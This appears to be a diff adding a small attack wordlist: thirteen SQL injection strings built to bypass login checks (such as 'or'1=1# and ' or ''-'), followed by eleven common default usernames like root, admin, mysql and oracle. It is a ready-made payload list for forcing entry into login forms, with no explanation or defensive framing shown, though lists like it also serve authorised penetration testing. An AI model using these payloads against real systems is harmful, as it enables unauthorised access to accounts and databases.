@@ -1,0 +1,24 @@
+'or'1=1#
+'=''or'
+'-'
+' '
+'&'
+'^'
+'*'
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+"-"
+root
+admin
+test
+guest
+info
+adm
+mysql
+user
+administrator
+oracle
+ftp
